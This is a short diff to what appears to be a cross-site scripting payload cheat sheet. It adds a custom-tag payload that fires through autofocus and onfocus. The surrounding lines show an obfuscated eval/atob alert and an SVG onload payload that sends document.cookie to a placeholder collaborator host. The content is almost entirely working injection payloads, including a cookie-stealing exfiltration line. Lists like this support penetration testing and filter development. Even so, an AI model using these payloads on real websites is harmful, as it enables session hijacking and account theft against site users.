@@ -33,6 +33,9 @@ eval.call`${atob`YWxlcnQoMSk=`}`
 
 // SVG to steal cookie
 '"><svg/onload=fetch(`//<your-collaborator>/cookie?=${encodeURIComponent(document.cookie)}`)>
+
+// Custom tags
+<xss autofocus tabindex=1 onfocus=alert(1)></xss>
 ```
 
 # Code Injection
